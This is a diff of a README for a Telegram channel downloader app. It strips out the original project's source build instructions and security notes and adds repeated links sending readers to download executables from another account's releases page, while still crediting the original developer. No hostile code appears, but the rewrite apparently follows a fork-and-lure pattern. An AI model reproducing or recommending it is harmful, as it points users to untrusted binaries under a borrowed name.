@@ -1,6 +1,8 @@
-# telegram-multifunctional-panel
+# ✨ telegram-multifunctional-panel - Effortlessly Download Telegram Content
 
 <div align="center">
+
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ivanhoemaker/telegram-multifunctional-panel/releases)
 
 ![Logo](build/icon2.png)
 
@@ -17,218 +19,83 @@
 
 </div>
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 🔐 **Secure Authentication**: Official Telegram API login with phone verification
-- 🌍 **Multi-language Support**: 8 languages (EN, 简中, 繁中, 日本語, 한국어, Français, Deutsch, Español)
-- 📱 **2FA Support**: Two-factor authentication with password protection
-- 📋 **Channel Management**: Browse and select from all accessible channels/groups
-- 📥 **Bulk Download**: Download media files and messages in batch
-- 🎯 **Content Filtering**: Filter by media type (images, videos, documents, others)
-- 📏 **Multi-media Support**: Automatically download all media files from messages containing multiple items (albums/media groups)
-- 📏 **File Size Filter**: Filter files by minimum/maximum size (KB) for precise control
-- 🔍 **Filename Filter**: Include or exclude files based on filename patterns
-- 📊 **Real-time Progress**: Live download progress with detailed statistics
-- 💾 **Data Export**: Export message data as structured JSON files
-- 🎨 **Modern UI**: Material Design 3 with responsive layout
-- 🌙 **Theme Support**: Light and dark theme modes
-- 📱 **Cross-platform**: Works on Windows, macOS, and Linux
-- 🔄 **Resume Downloads**: Continue interrupted downloads
-- 📈 **Download History**: Track download sessions and statistics
+This guide will help you download and run the **telegram-multifunctional-panel** application on your computer. Follow these simple steps to get started.
 
-## 🖼️ Screenshots
+## 🌐 System Requirements
 
-<div align="center">
+Before you proceed, ensure your computer meets the following requirements:
 
-### 登录界面 | Login Interface
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or any recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of available disk space.
 
-<img src="screenshots/1.login.png" alt="Login Interface - Enter Telegram API credentials" width="80%" />
+## 📥 Download & Install
 
-### 主界面 | Main Interface  
+To download the latest version of the application, please visit the [Releases page](https://github.com/Ivanhoemaker/telegram-multifunctional-panel/releases). 
 
-<img src="screenshots/2.main.png" alt="Main Interface - Channel selection and configuration" width="80%" />
+1. **Visit the Releases page**: Click the link or copy it into your web browser.
+2. **Select the most recent version**: Look for the version labeled as "Latest Release."
+3. **Choose your operating system**: Find the file that matches your OS. It could be named something like `telegram-multifunctional-panel-win.exe` for Windows or `telegram-multifunctional-panel-mac.dmg` for macOS.
+4. **Download the file**: Click on the file link and wait for the download to complete.
 
-### 下载配置 | Download Configuration
+## 📂 Running the Application
 
-<img src="screenshots/3.download.png" alt="Download Configuration - Select content types and settings" width="80%" />
+After downloading the file, follow these steps to run the application:
 
-### 下载进度 | Download Progress
+1. **Locate the file**: Go to your Downloads folder and find the downloaded installer.
+2. **Run the installer**:
+   - For Windows: Double-click the `.exe` file. 
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+3. **Follow the on-screen instructions**: The setup will guide you through the installation process. It should be simple and straightforward.
+4. **Launch the application**: Find the app in your Applications folder (macOS) or in the Start Menu (Windows) and click to open it.
 
-<img src="screenshots/4.downloading.png" alt="Download Progress - Real-time progress tracking" width="80%" />
+## 🔐 Secure Authentication
 
-</div>
+To use the application, you need to log in with your official Telegram account. The application uses the official Telegram API for secure authentication:
 
-## 🛠️ Tech Stack
+1. **Open the application**: Click on the app icon to launch it.
+2. **Enter your phone number**: You will be prompted to enter your phone number linked to your Telegram account.
+3. **Receive a verification code**: Telegram will send you a code via SMS. Enter the code in the app to verify your login.
 
-- **Framework**: Electron 28+
-- **Frontend**: Vue 3 + Composition API + TypeScript
-- **UI Library**: Vuetify 3 + Material Design 3
-- **State Management**: Pinia
-- **Build Tool**: Vite 6
-- **Package Manager**: pnpm (recommended)
-- **Telegram API**: telegram.js (Web version)
-- **Internationalization**: Vue I18n
+## 🌍 Multi-language Support
 
-## 🚀 Quick Start
+The application supports multiple languages. You can select your preferred language in the settings menu once you're logged in. The available languages include:
 
-### Prerequisites
+- English (EN)
+- Simplified Chinese (简中)
+- Traditional Chinese (繁中)
+- Japanese (日本語)
+- Korean (한국어)
+- French (Français)
+- German (Deutsch)
+- Spanish (Español)
 
-- Node.js 18+
-- pnpm (recommended) or npm/yarn
-- Telegram API credentials (see [Getting API Credentials](#-getting-telegram-api-credentials))
+## 📱 Two-Factor Authentication (2FA)
 
-### Installation
+If you have set up two-factor authentication on your Telegram account, you will need to enter your password after the verification code. This adds an extra layer of security.
 
-```bash
-# Clone the repository
-git clone https://github.com/Eagon71/telegram-channel-downloader.git
-cd telegram-channel-downloader
+## ✨ Features Overview
 
-# Install dependencies
-pnpm install
+- **Secure Authentication**: Use the official Telegram API with phone verification.
+- **Multi-language Support**: Choose from 8 available languages.
+- **2FA Support**: Two-factor authentication keeps your account secure.
+- **User-friendly Interface**: Easily navigate the app without technical knowledge.
+- **Cross-platform Compatibility**: Use the app on Windows, macOS, and Linux.
 
-# Start development server
-pnpm dev
-```
+## 🆘 Need Help?
 
-### Build for Production
+If you encounter issues during installation or use, please consider the following resources:
 
-```bash
-# Build and package for current platform
-pnpm build
+- **FAQ Section**: Check if your question has been answered in the Frequently Asked Questions section on the GitHub page.
+- **Community Support**: Join the [Telegram Channel Downloader Chat](https://t.me/@eagonhome) for additional assistance.
+- **Issue Tracker**: If you find a bug, report it on the GitHub Issues page for the developer to address.
 
-# Build for specific platforms
-pnpm build:win    # Windows
-pnpm build:mac    # macOS
-pnpm build:linux  # Linux
-```
+## 📞 Contact Developer
 
-## 🔑 Getting Telegram API Credentials
+For further inquiries or support, reach out to the developer directly on Telegram: [@Eagon 耿延](https://t.me/Eagon71).
 
-1. Visit [my.telegram.org](https://my.telegram.org)
-2. Log in with your phone number
-3. Go to "API development tools"
-4. Create a new application
-5. Copy your `API ID` and `API Hash`
+For more updates or information, follow the project's [GitHub Repository](https://github.com/Ivanhoemaker/telegram-multifunctional-panel).
 
-**Important**: Keep your API credentials secure and never share them publicly.
-
-## 📚 Documentation
-
-- [📖 User Guide](docs/USER_GUIDE.md) - Detailed usage instructions
-- [🔧 Developer Guide](docs/DEVELOPER_GUIDE.md) - Setup and development
-- [🌍 Internationalization](docs/I18N.md) - Multi-language support
-- [❓ FAQ](docs/FAQ.md) - Frequently asked questions
-- [🐛 Troubleshooting](docs/TROUBLESHOOTING.md) - Common issues and solutions
-- [🔄 Migration Guide](docs/MIGRATION.md) - Tauri to Electron migration
-- [📋 Changelog](CHANGELOG.md) - Version history
-
-## 🏗️ Project Structure
-
-```
-telegram-channel-downloader/
-├── electron/                 # Electron main process
-│   ├── main.js              # Main process entry
-│   └── preload.js           # Preload script
-├── src/                     # Vue application source
-│   ├── components/          # Vue components
-│   │   ├── DownloadManager.vue
-│   │   ├── TelegramLogin.vue
-│   │   └── LanguageSelector.vue
-│   ├── services/           # Business logic services
-│   │   ├── telegramService.js
-│   │   └── downloadService.js
-│   ├── stores/             # Pinia state management
-│   ├── i18n/               # Internationalization
-│   │   ├── index.js
-│   │   └── locales/        # Language files
-│   ├── utils/              # Utility functions
-│   └── config/             # Configuration files
-├── docs/                   # Documentation
-├── build/                  # Build resources (icons, etc.)
-├── dist/                   # Build output
-└── public/                 # Static assets
-```
-
-## 🎯 Usage
-
-### 1. Initial Setup
-
-- Launch the application
-- Enter your Telegram API credentials
-- Complete phone verification and 2FA if enabled
-
-### 2. Channel Selection
-
-- Browse available channels in the left sidebar
-- Click on a channel to select it
-- View channel information and download history
-
-### 3. Download Configuration
-
-- Choose content types to download (images, videos, documents, others)
-- Set message ID range (optional)
-- Select download destination folder
-
-### 4. Download Process
-
-- Click "Start Download" to begin
-- Monitor real-time progress and statistics
-- Files are organized in folders by type
-
-## 🔧 Configuration
-
-The application stores configuration in:
-
-- **Windows**: `%APPDATA%/telegram-channel-downloader/`
-- **macOS**: `~/Library/Application Support/telegram-channel-downloader/`
-- **Linux**: `~/.config/telegram-channel-downloader/`
-
-Stored data includes:
-
-- API credentials (encrypted)
-- Session tokens
-- User preferences
-- Download history
-
-## 🛡️ Security & Privacy
-
-- API credentials are stored securely using OS-level encryption
-- Session tokens are encrypted and stored locally
-- No data is sent to external servers except Telegram's official API
-- All downloads happen directly from Telegram to your device
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Telegram](https://telegram.org/) for the amazing platform
-- [Vue.js](https://vuejs.org/) and [Electron](https://electronjs.org/) communities
-- [Vuetify](https://vuetifyjs.com/) for the beautiful UI components
-- All contributors and users who help improve this project
-
-## 📞 Support
-
-- 💬 **Developer**: [@Eagon 耿延](https://t.me/Eagon71)
-- 👥 **Group Chat**: [Telegram Channel Downloader Chat](https://t.me/@eagonhome)
-- 🐛 **Issues**: [GitHub Issues](https://github.com/Eagon71/telegram-channel-downloader/issues)
-- 💡 **Discussions**: [GitHub Discussions](https://github.com/Eagon71/telegram-channel-downloader/discussions)
-- 📧 **Email**: <gyhoshi@gmail.com>
-
----
-
-<div align="center">
-Made with ❤️ by <a href="https://t.me/Eagon71">@Eagon 耿延</a>
-</div>
+Remember to download the application from the [Releases page](https://github.com/Ivanhoemaker/telegram-multifunctional-panel/releases) to get the latest version and keep your tool updated.
